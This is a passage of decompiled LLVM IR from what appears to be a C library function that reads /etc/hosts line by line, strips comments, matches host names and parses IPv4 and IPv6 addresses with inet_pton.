  %v0_804da12 = phi i32 [ %arg6, %entry ], [ %v2_804da05, %dec_label_pc_804da05 ]
  %v0_804da15 = phi i32 [ %arg7, %entry ], [ %v2_804d9fd, %dec_label_pc_804da05 ]
  %tmp149 = icmp ult i32 %v0_804da15, 32
  br i1 %tmp149, label %dec_label_pc_804dcad, label %dec_label_pc_804da12

dec_label_pc_804da12:                             ; preds = %dec_label_pc_804da09
  %v1_804da12 = add i32 %v0_804da12, 32
  store i32 %v1_804da12, i32* %eax.global-to-local, align 4
  %v1_804da15 = add i32 %v0_804da15, -32
  store i32 %v1_804da15, i32* @ebp, align 4
  %v5_804da18 = inttoptr i32 %v1_804da12 to i8*
  %v12_804da1c = icmp eq i32 %arg4, 1
  br i1 %v12_804da1c, label %dec_label_pc_804db3e, label %dec_label_pc_804da27

dec_label_pc_804da27:                             ; preds = %dec_label_pc_804da12
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_804da2e = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_804da2e, align 4
  %tmp150 = icmp ult i32 %v1_804da15, 4
  br i1 %tmp150, label %dec_label_pc_804dcad, label %dec_label_pc_804da3a

dec_label_pc_804da3a:                             ; preds = %dec_label_pc_804da27
  %v0_804da3a = load i32, i32* %edx.global-to-local, align 4
  %v1_804da3a = add i32 %v0_804da3a, -36
  store i32 %v1_804da3a, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_804da3a, 8
  br i1 %tmp151, label %dec_label_pc_804dcad, label %dec_label_pc_804da46

dec_label_pc_804da46:                             ; preds = %dec_label_pc_804da3a
  %v0_804da46 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_804da46, 16
  br i1 %tmp152, label %dec_label_pc_804dcad, label %dec_label_pc_804da4f

dec_label_pc_804da4f:                             ; preds = %dec_label_pc_804da46
  %v1_804da4f = add i32 %v0_804da3a, -48
  store i32 %v1_804da4f, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_804da4f, 8
  br i1 %tmp153, label %dec_label_pc_804dcad, label %dec_label_pc_804da5b

dec_label_pc_804da5b:                             ; preds = %dec_label_pc_804da4f
  %v0_804da5b = load i32, i32* @ebx, align 4
  %v1_804da5b = add i32 %v0_804da5b, 48
  %v1_804da5e = add i32 %v0_804da3a, -44
  store i32 %v1_804da5e, i32* @ebp, align 4
  %v1_804da65 = add i32 %v0_804da3a, -56
  store i32 %v1_804da65, i32* @eax, align 4
  %v1_804da68 = add i32 %v0_804da5b, 36
  store i32 %v1_804da68, i32* @edi, align 4
  %v7_804da6b = icmp ult i32 %v1_804da65, %v1_804da5e
  br i1 %v7_804da6b, label %dec_label_pc_804da74, label %dec_label_pc_804da6f

dec_label_pc_804da6f:                             ; preds = %dec_label_pc_804da5b
  %v1_804da6f = add i32 %v0_804da5b, 44
  store i32 %v1_804da6f, i32* @esi, align 4
  br label %dec_label_pc_804da79

dec_label_pc_804da74:                             ; preds = %dec_label_pc_804da5b
  %v1_804da74 = add i32 %v0_804da5b, 56
  store i32 %v1_804da74, i32* @esi, align 4
  store i32 %v1_804da65, i32* @ebp, align 4
  br label %dec_label_pc_804da79

dec_label_pc_804da79:                             ; preds = %dec_label_pc_804da6f, %dec_label_pc_804da74
  %v0_804da79 = phi i32 [ %v1_804da5e, %dec_label_pc_804da6f ], [ %v1_804da65, %dec_label_pc_804da74 ]
  %tmp154 = icmp ult i32 %v0_804da79, 80
  br i1 %tmp154, label %dec_label_pc_804dcad, label %dec_label_pc_804da82

dec_label_pc_804da82:                             ; preds = %dec_label_pc_804da79
  %v0_804da82 = call i32 @__open_etc_hosts()
  store i32 %v0_804da82, i32* %eax.global-to-local, align 4
  %v1_804da8b = icmp eq i32 %v0_804da82, 0
  br i1 %v1_804da8b, label %dec_label_pc_804daaf, label %dec_label_pc_804da8f

dec_label_pc_804da8f:                             ; preds = %dec_label_pc_804da82
  store i32 %v1_804da12, i32* %edx.global-to-local, align 4
  store i32 %v1_804da5b, i32* %eax.global-to-local, align 4
  store i8* %v5_804da18, i8** %stack_var_-44, align 4
  %v0_804da9a = load i32, i32* @edi, align 4
  %v0_804daa6 = load i32, i32* @esi, align 4
  %v5_804daa6 = inttoptr i32 %v0_804daa6 to i8*
  br label %dec_label_pc_804db5d

dec_label_pc_804daaf:                             ; preds = %dec_label_pc_804da82
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_804dab3 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_804dab3, align 4
  %v1_804dab9 = call i32 @__errno_location(i32 0)
  store i32 %v1_804dab9, i32* %eax.global-to-local, align 4
  %v1_804dabe = inttoptr i32 %v1_804dab9 to i32*
  %v2_804dabe = load i32, i32* %v1_804dabe, align 4
  store i32 %v2_804dabe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dcad

dec_label_pc_804dac9:                             ; preds = %dec_label_pc_804dc30
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_804dacd = load i8*, i8** %stack_var_-44, align 4
  %v3_804dacd = ptrtoint i8* %v2_804dacd to i32
  %v2_804dad0 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_804dacd, i32* %v2_804dad0, align 4
  %v0_804dad2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dad2 = add i32 %v0_804dad2, 4
  %v2_804dad2 = inttoptr i32 %v1_804dad2 to i32*
  store i32 0, i32* %v2_804dad2, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_804dadd = load i32, i32* @ebx, align 4
  %v1_804dadd = add i32 %v0_804dadd, 4
  %v2_804dadd = inttoptr i32 %v1_804dadd to i32*
  %v3_804dadd = load i32, i32* %v2_804dadd, align 4
  store i32 %v3_804dadd, i32* %eax.global-to-local, align 4
  store i32 %v3_804dadd, i32* %arg5, align 4
  %v0_804dae2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dae2 = add i32 %v0_804dae2, 8
  %v2_804dae2 = inttoptr i32 %v1_804dae2 to i32*
  store i32 2, i32* %v2_804dae2, align 4
  %v0_804dae9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dae9 = add i32 %v0_804dae9, 12
  %v2_804dae9 = inttoptr i32 %v1_804dae9 to i32*
  store i32 4, i32* %v2_804dae9, align 4
  br label %dec_label_pc_804db22

dec_label_pc_804daf6:                             ; preds = %dec_label_pc_804dc52
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_804dafe = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_804dafe, align 4
  %v0_804db00 = load i32, i32* %edx.global-to-local, align 4
  %v1_804db00 = add i32 %v0_804db00, 4
  %v2_804db00 = inttoptr i32 %v1_804db00 to i32*
  store i32 0, i32* %v2_804db00, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_804db0b = load i32, i32* @ebx, align 4
  %v1_804db0b = add i32 %v0_804db0b, 4
  %v2_804db0b = inttoptr i32 %v1_804db0b to i32*
  %v3_804db0b = load i32, i32* %v2_804db0b, align 4
  store i32 %v3_804db0b, i32* %eax.global-to-local, align 4
  store i32 %v3_804db0b, i32* %arg5, align 4
  %v0_804db10 = load i32, i32* %edx.global-to-local, align 4
  %v1_804db10 = add i32 %v0_804db10, 8
  %v2_804db10 = inttoptr i32 %v1_804db10 to i32*
  store i32 10, i32* %v2_804db10, align 4
  %v0_804db17 = load i32, i32* %edx.global-to-local, align 4
  %v1_804db17 = add i32 %v0_804db17, 12
  %v2_804db17 = inttoptr i32 %v1_804db17 to i32*
  store i32 16, i32* %v2_804db17, align 4
  br label %dec_label_pc_804db22

dec_label_pc_804db22:                             ; preds = %dec_label_pc_804dac9, %dec_label_pc_804daf6
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_804dac9 ], [ %stack_var_-32.0, %dec_label_pc_804daf6 ]
  %v1_804db22 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db22 = add i32 %v1_804db22, 16
  %v3_804db22 = inttoptr i32 %v2_804db22 to i32*
  store i32 %storemerge, i32* %v3_804db22, align 4
  %v0_804db25 = load i32, i32* @ebx, align 4
  %v1_804db25 = add i32 %v0_804db25, 8
  %v1_804db28 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db28 = add i32 %v1_804db28, 4
  %v3_804db28 = inttoptr i32 %v2_804db28 to i32*
  store i32 %v1_804db25, i32* %v3_804db28, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_804db2f = load i32, i32* %edx.global-to-local, align 4
  %v2_804db2f = inttoptr i32 %arg8 to i32*
  store i32 %v0_804db2f, i32* %v2_804db2f, align 4
  br label %dec_label_pc_804dc8d

dec_label_pc_804db3e:                             ; preds = %dec_label_pc_804da12
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_804db5d

dec_label_pc_804db5d:                             ; preds = %dec_label_pc_804da8f, %dec_label_pc_804db3e
  %v1_804db61.pre-phi = phi i32* [ %v1_804da2e, %dec_label_pc_804da8f ], [ %.pre, %dec_label_pc_804db3e ]
  %stack_var_-32.0 = phi i32 [ %v1_804da5b, %dec_label_pc_804da8f ], [ 0, %dec_label_pc_804db3e ]
  %stack_var_-36.0 = phi i32 [ %v1_804da12, %dec_label_pc_804da8f ], [ 0, %dec_label_pc_804db3e ]
  %stack_var_-40.0 = phi i32 [ %v0_804da9a, %dec_label_pc_804da8f ], [ 0, %dec_label_pc_804db3e ]
  %stack_var_4.0 = phi i32 [ %v0_804da82, %dec_label_pc_804da8f ], [ %arg1, %dec_label_pc_804db3e ]
  %stack_var_-20.0 = phi i8* [ %v5_804daa6, %dec_label_pc_804da8f ], [ %v5_804da18, %dec_label_pc_804db3e ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_804db61.pre-phi, align 4
  %v4_804dc79 = ptrtoint i8* %stack_var_-20.0 to i32
  %v4_804dc16 = inttoptr i32 %arg2 to i8*
  %v0_804dc73120127 = load i32, i32* @edx, align 4
  %v3_804dc7d121128 = call i32 @fgets(i32 %v4_804dc79, i32 %stack_var_4.0, i32 %v0_804dc73120127)
  store i32 %v3_804dc7d121128, i32* @eax, align 4
  %v1_804dc85122129 = icmp eq i32 %v3_804dc7d121128, 0
  %v1_804dc87123130 = icmp eq i1 %v1_804dc85122129, false
  br i1 %v1_804dc87123130, label %dec_label_pc_804db74.lr.ph.lr.ph, label %dec_label_pc_804dc8d

dec_label_pc_804db74.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804db5d
  %v12_804dc4b = icmp eq i32 %arg3, 10
  %v12_804dc29 = icmp eq i32 %arg3, 2
  %v12_804dbf0 = icmp eq i32 %arg4, 2
  %v1_804dbf5 = icmp eq i1 %v12_804dbf0, false
  %v1_804dc2e = icmp eq i1 %v12_804dc29, false
  %v1_804dc50 = icmp eq i1 %v12_804dc4b, false
  br label %dec_label_pc_804db74.lr.ph

dec_label_pc_804db74.lr.ph:                       ; preds = %dec_label_pc_804db74.lr.ph.lr.ph, %dec_label_pc_804dc73.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_804db74.lr.ph.lr.ph ], [ 2, %dec_label_pc_804dc73.outer.backedge ]
  br label %dec_label_pc_804db74

dec_label_pc_804db74:                             ; preds = %dec_label_pc_804db74.lr.ph, %dec_label_pc_804dc73.backedge
  %v3_804db7c = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_804db7c, i32* @eax, align 4
  %v1_804db84 = icmp eq i32 %v3_804db7c, 0
  br i1 %v1_804db84, label %dec_label_pc_804db8b, label %dec_label_pc_804db88

dec_label_pc_804db88:                             ; preds = %dec_label_pc_804db74
  %v1_804db88 = inttoptr i32 %v3_804db7c to i8*
  store i8 0, i8* %v1_804db88, align 1
  br label %dec_label_pc_804db8b

dec_label_pc_804db8b:                             ; preds = %dec_label_pc_804db74, %dec_label_pc_804db88
  store i32 %v4_804dc79, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_804dbcb32 = load i8, i8* %stack_var_-20.0, align 1
  %v3_804dbcb33 = icmp eq i8 %v2_804dbcb32, 0
  %v1_804dbce39 = icmp eq i1 %v3_804dbcb33, false
  br i1 %v1_804dbce39, label %dec_label_pc_804db97.preheader.preheader, label %dec_label_pc_804dbd0

dec_label_pc_804db97.preheader.preheader:         ; preds = %dec_label_pc_804db8b
  %v4_804db9797.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804db97.preheader

dec_label_pc_804db93:                             ; preds = %dec_label_pc_804db9d
  store i8 0, i8* %v1_804db97102, align 1
  %v0_804db96 = load i32, i32* @ecx, align 4
  %v1_804db96 = add i32 %v0_804db96, 1
  store i32 %v1_804db96, i32* @ecx, align 4
  %v1_804db97 = inttoptr i32 %v1_804db96 to i8*
  %v2_804db97 = load i8, i8* %v1_804db97, align 1
  %v3_804db97 = zext i8 %v2_804db97 to i32
  %v4_804db97 = load i32, i32* %eax.global-to-local, align 4
  %v5_804db97 = and i32 %v4_804db97, -256
  %v6_804db97 = or i32 %v5_804db97, %v3_804db97
  store i32 %v6_804db97, i32* @eax, align 4
  %v4_804db99 = icmp eq i8 %v2_804db97, 0
  br i1 %v4_804db99, label %dec_label_pc_804db97.dec_label_pc_804dbd0.loopexit_crit_edge, label %dec_label_pc_804db9d

dec_label_pc_804db9d:                             ; preds = %dec_label_pc_804db97.preheader, %dec_label_pc_804db93
  %v2_804db97103 = phi i8 [ %v2_804db97, %dec_label_pc_804db93 ], [ %v2_804db9795, %dec_label_pc_804db97.preheader ]
  %v1_804db97102 = phi i8* [ %v1_804db97, %dec_label_pc_804db93 ], [ %v1_804db9794, %dec_label_pc_804db97.preheader ]
  %v0_804db93101 = phi i32 [ %v1_804db96, %dec_label_pc_804db93 ], [ %v0_804db9747, %dec_label_pc_804db97.preheader ]
  %v2_804db9d = sext i8 %v2_804db97103 to i32
  store i32 %v2_804db9d, i32* @edx, align 4
  %v0_804dba0 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804dba0, i32* %eax.global-to-local, align 4
  %v2_804dba5 = mul nsw i32 %v2_804db9d, 2
  %v3_804dba5 = add i32 %v0_804dba0, %v2_804dba5
  %v4_804dba5 = inttoptr i32 %v3_804dba5 to i8*
  %v5_804dba5 = load i8, i8* %v4_804dba5, align 1
  %v6_804dba5 = and i8 %v5_804dba5, 32
  %v7_804dba5 = icmp eq i8 %v6_804dba5, 0
  %v1_804dba9 = icmp eq i1 %v7_804dba5, false
  br i1 %v1_804dba9, label %dec_label_pc_804db93, label %dec_label_pc_804dbab

dec_label_pc_804dbab:                             ; preds = %dec_label_pc_804db9d
  %v0_804dbab = load i32, i32* @edi, align 4
  %v1_804dbab = add i32 %v0_804dbab, -6
  %v6_804dbab = sub i32 5, %v0_804dbab
  %v7_804dbab = and i32 %v6_804dbab, %v0_804dbab
  %v8_804dbab = icmp slt i32 %v7_804dbab, 0
  %v9_804dbab = icmp eq i32 %v1_804dbab, 0
  %v10_804dbab = icmp slt i32 %v1_804dbab, 0
  %v3_804dbae = icmp eq i1 %v10_804dbab, %v8_804dbab
  %v4_804dbae = icmp eq i1 %v9_804dbab, false
  %v5_804dbae = and i1 %v4_804dbae, %v3_804dbae
  br i1 %v5_804dbae, label %dec_label_pc_804dbb7.preheader, label %dec_label_pc_804dbb0

dec_label_pc_804dbb0:                             ; preds = %dec_label_pc_804dbab
  %v1_804dbb0 = load i32, i32* @ebx, align 4
  %v3_804dbb0 = mul i32 %v0_804dbab, 4
  %v4_804dbb0 = add i32 %v1_804dbb0, %v3_804dbb0
  %v5_804dbb0 = inttoptr i32 %v4_804dbb0 to i32*
  store i32 %v0_804db93101, i32* %v5_804dbb0, align 4
  %v0_804dbb3 = load i32, i32* @edi, align 4
  %v1_804dbb3 = add i32 %v0_804dbb3, 1
  store i32 %v1_804dbb3, i32* @edi, align 4
  %v0_804dbb7.pre.pre = load i32, i32* @ecx, align 4
  %v4_804dbb7.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbb7.preheader

dec_label_pc_804dbb7.preheader:                   ; preds = %dec_label_pc_804dbb0, %dec_label_pc_804dbab
  %v4_804dbb7.pre = phi i32 [ %v4_804dbb7.pre.pre, %dec_label_pc_804dbb0 ], [ %v0_804dba0, %dec_label_pc_804dbab ]
  %v0_804dbb7.pre = phi i32 [ %v0_804dbb7.pre.pre, %dec_label_pc_804dbb0 ], [ %v0_804db93101, %dec_label_pc_804dbab ]
  %v1_804dbd052 = phi i32 [ %v1_804dbb3, %dec_label_pc_804dbb0 ], [ %v0_804dbab, %dec_label_pc_804dbab ]
  %v1_804dbb7104 = inttoptr i32 %v0_804dbb7.pre to i8*
  %v2_804dbb7105 = load i8, i8* %v1_804dbb7104, align 1
  %v3_804dbb7106 = zext i8 %v2_804dbb7105 to i32
  %v5_804dbb7107 = and i32 %v4_804dbb7.pre, -256
  %v6_804dbb7108 = or i32 %v3_804dbb7106, %v5_804dbb7107
  store i32 %v6_804dbb7108, i32* @eax, align 4
  %v4_804dbb9109 = icmp eq i8 %v2_804dbb7105, 0
  br i1 %v4_804dbb9109, label %dec_label_pc_804dbcb.loopexit, label %dec_label_pc_804dbbd.lr.ph

dec_label_pc_804dbbd.lr.ph:                       ; preds = %dec_label_pc_804dbb7.preheader
  %v0_804dbc0.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804dbbd

dec_label_pc_804dbb6:                             ; preds = %dec_label_pc_804dbbd
  %v1_804dbb6 = add i32 %v0_804dbcb110, 1
  store i32 %v1_804dbb6, i32* @ecx, align 4
  %v1_804dbb7 = inttoptr i32 %v1_804dbb6 to i8*
  %v2_804dbb7 = load i8, i8* %v1_804dbb7, align 1
  %v3_804dbb7 = zext i8 %v2_804dbb7 to i32
  %v5_804dbb7 = and i32 %v0_804dbc0.pre, -256
  %v6_804dbb7 = or i32 %v3_804dbb7, %v5_804dbb7
  store i32 %v6_804dbb7, i32* @eax, align 4
  %v4_804dbb9 = icmp eq i8 %v2_804dbb7, 0
  br i1 %v4_804dbb9, label %dec_label_pc_804dbcb.loopexit, label %dec_label_pc_804dbbd

dec_label_pc_804dbbd:                             ; preds = %dec_label_pc_804dbbd.lr.ph, %dec_label_pc_804dbb6
  %v2_804dbb7112 = phi i8 [ %v2_804dbb7105, %dec_label_pc_804dbbd.lr.ph ], [ %v2_804dbb7, %dec_label_pc_804dbb6 ]
  %v1_804dbb7111 = phi i8* [ %v1_804dbb7104, %dec_label_pc_804dbbd.lr.ph ], [ %v1_804dbb7, %dec_label_pc_804dbb6 ]
  %v0_804dbcb110 = phi i32 [ %v0_804dbb7.pre, %dec_label_pc_804dbbd.lr.ph ], [ %v1_804dbb6, %dec_label_pc_804dbb6 ]
  %v2_804dbbd = sext i8 %v2_804dbb7112 to i32
  store i32 %v2_804dbbd, i32* @edx, align 4
  store i32 %v0_804dbc0.pre, i32* @eax, align 4
  %v2_804dbc5 = mul nsw i32 %v2_804dbbd, 2
  %v3_804dbc5 = add i32 %v0_804dbc0.pre, %v2_804dbc5
  %v4_804dbc5 = inttoptr i32 %v3_804dbc5 to i8*
  %v5_804dbc5 = load i8, i8* %v4_804dbc5, align 1
  %v6_804dbc5 = and i8 %v5_804dbc5, 32
  %v7_804dbc5 = icmp eq i8 %v6_804dbc5, 0
  br i1 %v7_804dbc5, label %dec_label_pc_804dbb6, label %dec_label_pc_804dbcb.loopexit

dec_label_pc_804dbcb.loopexit:                    ; preds = %dec_label_pc_804dbbd, %dec_label_pc_804dbb6, %dec_label_pc_804dbb7.preheader
  %v4_804db9797144 = phi i32 [ %v6_804dbb7108, %dec_label_pc_804dbb7.preheader ], [ %v6_804dbb7, %dec_label_pc_804dbb6 ], [ %v0_804dbc0.pre, %dec_label_pc_804dbbd ]
  %v0_804dbcb.lcssa = phi i32 [ %v0_804dbb7.pre, %dec_label_pc_804dbb7.preheader ], [ %v1_804dbb6, %dec_label_pc_804dbb6 ], [ %v0_804dbcb110, %dec_label_pc_804dbbd ]
  %v1_804dbb7.lcssa = phi i8* [ %v1_804dbb7104, %dec_label_pc_804dbb7.preheader ], [ %v1_804dbb7, %dec_label_pc_804dbb6 ], [ %v1_804dbb7111, %dec_label_pc_804dbbd ]
  %v2_804dbcb = load i8, i8* %v1_804dbb7.lcssa, align 1
  %v3_804dbcb = icmp eq i8 %v2_804dbcb, 0
  %v1_804dbce = icmp eq i1 %v3_804dbcb, false
  br i1 %v1_804dbce, label %dec_label_pc_804db97.preheader, label %dec_label_pc_804dbd0

dec_label_pc_804db97.preheader:                   ; preds = %dec_label_pc_804db97.preheader.preheader, %dec_label_pc_804dbcb.loopexit
  %v1_804dbd0.pre147 = phi i32 [ %v1_804dbd052, %dec_label_pc_804dbcb.loopexit ], [ 0, %dec_label_pc_804db97.preheader.preheader ]
  %v4_804db9797 = phi i32 [ %v4_804db9797144, %dec_label_pc_804dbcb.loopexit ], [ %v4_804db9797.pre, %dec_label_pc_804db97.preheader.preheader ]
  %v0_804db9747 = phi i32 [ %v0_804dbcb.lcssa, %dec_label_pc_804dbcb.loopexit ], [ %v4_804dc79, %dec_label_pc_804db97.preheader.preheader ]
  %v1_804db9794 = inttoptr i32 %v0_804db9747 to i8*
  %v2_804db9795 = load i8, i8* %v1_804db9794, align 1
  %v3_804db9796 = zext i8 %v2_804db9795 to i32
  %v5_804db9798 = and i32 %v4_804db9797, -256
  %v6_804db9799 = or i32 %v5_804db9798, %v3_804db9796
  store i32 %v6_804db9799, i32* @eax, align 4
  %v4_804db99100 = icmp eq i8 %v2_804db9795, 0
  br i1 %v4_804db99100, label %dec_label_pc_804dbd0, label %dec_label_pc_804db9d

dec_label_pc_804db97.dec_label_pc_804dbd0.loopexit_crit_edge: ; preds = %dec_label_pc_804db93
  %v1_804dbd0.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804dbd0

dec_label_pc_804dbd0:                             ; preds = %dec_label_pc_804dbcb.loopexit, %dec_label_pc_804db97.dec_label_pc_804dbd0.loopexit_crit_edge, %dec_label_pc_804db97.preheader, %dec_label_pc_804db8b
  %v1_804dbd0 = phi i32 [ 0, %dec_label_pc_804db8b ], [ %v1_804dbd0.pre.pre, %dec_label_pc_804db97.dec_label_pc_804dbd0.loopexit_crit_edge ], [ %v1_804dbd0.pre147, %dec_label_pc_804db97.preheader ], [ %v1_804dbd052, %dec_label_pc_804dbcb.loopexit ]
  %v0_804dbd0 = load i32, i32* @ebx, align 4
  %v2_804dbd0 = mul i32 %v1_804dbd0, 4
  %v3_804dbd0 = add i32 %v2_804dbd0, %v0_804dbd0
  %v4_804dbd0 = inttoptr i32 %v3_804dbd0 to i32*
  store i32 0, i32* %v4_804dbd0, align 4
  %v0_804dbd7 = load i32, i32* @edi, align 4
  %v7_804dbda = icmp sgt i32 %v0_804dbd7, 1
  br i1 %v7_804dbda, label %dec_label_pc_804dbe0, label %dec_label_pc_804dc73.backedge

dec_label_pc_804dbe0:                             ; preds = %dec_label_pc_804dbd0
  br i1 %v12_804da1c, label %dec_label_pc_804dcad, label %dec_label_pc_804dbeb

dec_label_pc_804dbeb:                             ; preds = %dec_label_pc_804dbe0
  store i32 1, i32* @esi, align 4
  br i1 %v1_804dbf5, label %dec_label_pc_804dc0d.lr.ph, label %dec_label_pc_804dbf7

dec_label_pc_804dc0d.lr.ph:                       ; preds = %dec_label_pc_804dbeb
  %v0_804dc0d.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804dc0d

dec_label_pc_804dbf7:                             ; preds = %dec_label_pc_804dbeb
  %v0_804dbf7 = load i32, i32* @eax, align 4
  %v0_804dbf9 = load i32, i32* @ebx, align 4
  %v1_804dbf9 = inttoptr i32 %v0_804dbf9 to i32*
  %v2_804dbf9 = load i32, i32* %v1_804dbf9, align 4
  %v5_804dbff = call i32 @__GI_strcoll(i8* %v4_804dc16, i32 %v2_804dbf9, i32 %v0_804dbf7, i32 %v0_804dbf7)
  store i32 %v5_804dbff, i32* %eax.global-to-local, align 4
  %v1_804dc07 = icmp eq i32 %v5_804dbff, 0
  %v1_804dc09 = icmp eq i1 %v1_804dc07, false
  br i1 %v1_804dc09, label %dec_label_pc_804dc73.backedge, label %dec_label_pc_804dc29

dec_label_pc_804dc73.backedge:                    ; preds = %dec_label_pc_804dc22, %dec_label_pc_804dbf7, %dec_label_pc_804dbd0
  %v0_804dc73 = load i32, i32* @edx, align 4
  %v3_804dc7d = call i32 @fgets(i32 %v4_804dc79, i32 %stack_var_4.0, i32 %v0_804dc73)
  store i32 %v3_804dc7d, i32* @eax, align 4
  %v1_804dc85 = icmp eq i32 %v3_804dc7d, 0
  %v1_804dc87 = icmp eq i1 %v1_804dc85, false
  br i1 %v1_804dc87, label %dec_label_pc_804db74, label %dec_label_pc_804dc8d

dec_label_pc_804dc0d:                             ; preds = %dec_label_pc_804dc0d.lr.ph, %dec_label_pc_804dc22
  %v0_804dc0d = phi i32 [ %v0_804dc0d.pre, %dec_label_pc_804dc0d.lr.ph ], [ %v5_804dc16, %dec_label_pc_804dc22 ]
  %v1_804dc0f119 = phi i32 [ 1, %dec_label_pc_804dc0d.lr.ph ], [ %v1_804dc22, %dec_label_pc_804dc22 ]
  %v0_804dc0f = load i32, i32* @ebx, align 4
  %v2_804dc0f = mul i32 %v1_804dc0f119, 4
  %v3_804dc0f = add i32 %v0_804dc0f, %v2_804dc0f
  %v4_804dc0f = inttoptr i32 %v3_804dc0f to i32*
  %v5_804dc0f = load i32, i32* %v4_804dc0f, align 4
  %v5_804dc16 = call i32 @__GI_strcasecmp(i8* %v4_804dc16, i32 %v5_804dc0f, i32 %v0_804dc0d, i32 %v0_804dc0d)
  store i32 %v5_804dc16, i32* %eax.global-to-local, align 4
  %v1_804dc1e = icmp eq i32 %v5_804dc16, 0
  br i1 %v1_804dc1e, label %dec_label_pc_804dc29, label %dec_label_pc_804dc22

dec_label_pc_804dc22:                             ; preds = %dec_label_pc_804dc0d
  %v0_804dc22 = load i32, i32* @esi, align 4
  %v1_804dc22 = add i32 %v0_804dc22, 1
  store i32 %v1_804dc22, i32* @esi, align 4
  %v1_804dc23.pre = load i32, i32* @edi, align 4
  %v5_804dc25 = icmp slt i32 %v1_804dc22, %v1_804dc23.pre
  br i1 %v5_804dc25, label %dec_label_pc_804dc0d, label %dec_label_pc_804dc73.backedge

dec_label_pc_804dc29:                             ; preds = %dec_label_pc_804dbf7, %dec_label_pc_804dc0d
  br i1 %v1_804dc2e, label %dec_label_pc_804dc4b, label %dec_label_pc_804dc30

dec_label_pc_804dc30:                             ; preds = %dec_label_pc_804dc29
  %v0_804dc30 = load i32, i32* @esi, align 4
  %v3_804dc31 = load i8*, i8** %stack_var_-44, align 4
  %v4_804dc31 = ptrtoint i8* %v3_804dc31 to i32
  %v0_804dc35 = load i32, i32* @ebx, align 4
  %v1_804dc35 = inttoptr i32 %v0_804dc35 to i32*
  %v2_804dc35 = load i32, i32* %v1_804dc35, align 4
  %v4_804dc39 = inttoptr i32 %v2_804dc35 to i8*
  %v5_804dc39 = call i32 @inet_pton(i32 2, i8* %v4_804dc39, i32 %v4_804dc31, i32 %v0_804dc30)
  store i32 %v5_804dc39, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_804dc39, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_804dac9, label %dec_label_pc_804dc73.outer.backedge

dec_label_pc_804dc73.outer.backedge:              ; preds = %dec_label_pc_804dc30, %dec_label_pc_804dc52, %dec_label_pc_804dc4b
  %v0_804dc73120 = load i32, i32* @edx, align 4
  %v3_804dc7d121 = call i32 @fgets(i32 %v4_804dc79, i32 %stack_var_4.0, i32 %v0_804dc73120)
  store i32 %v3_804dc7d121, i32* @eax, align 4
  %v1_804dc85122 = icmp eq i32 %v3_804dc7d121, 0
  %v1_804dc87123 = icmp eq i1 %v1_804dc85122, false
  br i1 %v1_804dc87123, label %dec_label_pc_804db74.lr.ph, label %dec_label_pc_804dc8d

dec_label_pc_804dc4b:                             ; preds = %dec_label_pc_804dc29
  br i1 %v1_804dc50, label %dec_label_pc_804dc73.outer.backedge, label %dec_label_pc_804dc52

dec_label_pc_804dc52:                             ; preds = %dec_label_pc_804dc4b
  %v0_804dc52 = load i32, i32* @ecx, align 4
  %v0_804dc57 = load i32, i32* @ebx, align 4
  %v1_804dc57 = inttoptr i32 %v0_804dc57 to i32*
  %v2_804dc57 = load i32, i32* %v1_804dc57, align 4
  %v4_804dc5b = inttoptr i32 %v2_804dc57 to i8*
  %v5_804dc5b = call i32 @inet_pton(i32 10, i8* %v4_804dc5b, i32 %stack_var_-36.0, i32 %v0_804dc52)
  store i32 %v5_804dc5b, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_804dc5b, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_804daf6, label %dec_label_pc_804dc73.outer.backedge

dec_label_pc_804dc8d:                             ; preds = %dec_label_pc_804dc73.outer.backedge, %dec_label_pc_804db5d, %dec_label_pc_804dc73.backedge, %dec_label_pc_804db22
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_804db22 ], [ 1, %dec_label_pc_804db5d ], [ 2, %dec_label_pc_804dc73.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_804dc73.backedge ]
  br i1 %v12_804da1c, label %dec_label_pc_804dcad, label %dec_label_pc_804dc94

dec_label_pc_804dc94:                             ; preds = %dec_label_pc_804dc8d
